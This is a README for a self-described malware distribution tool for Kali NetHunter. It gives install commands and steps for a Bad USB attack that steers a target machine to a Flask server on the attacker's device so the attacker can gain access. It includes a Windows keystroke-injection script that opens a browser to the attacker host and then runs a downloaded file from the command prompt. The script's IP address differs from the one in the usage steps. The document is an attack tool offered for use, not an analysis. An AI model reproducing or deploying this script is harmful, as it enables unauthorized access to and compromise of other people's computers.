# dispute
a simple malware distrupution program i made for kali nethunter

# Install
`git clone https://github.com/buffkermitisagod/dispute.git`
`cd dispute`
`python3 main.py`

# Usage
this is a simple script i made with flask to be used with kali nethunter and the bad usb arsenal   
1) connect device to target mechine
2) run usb tethering
3) run bad usb attack directing target to http://192.168.1.1:<port>
4) gain accses to there mechien :)

# Kali Bad usb example script
### Windows 
```
GUI r
DELAY 500
STRING iexplore -k http://126.168.1.1:<port>
ENTER
DELAY 600
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING ./downloads/run
ENTER

```
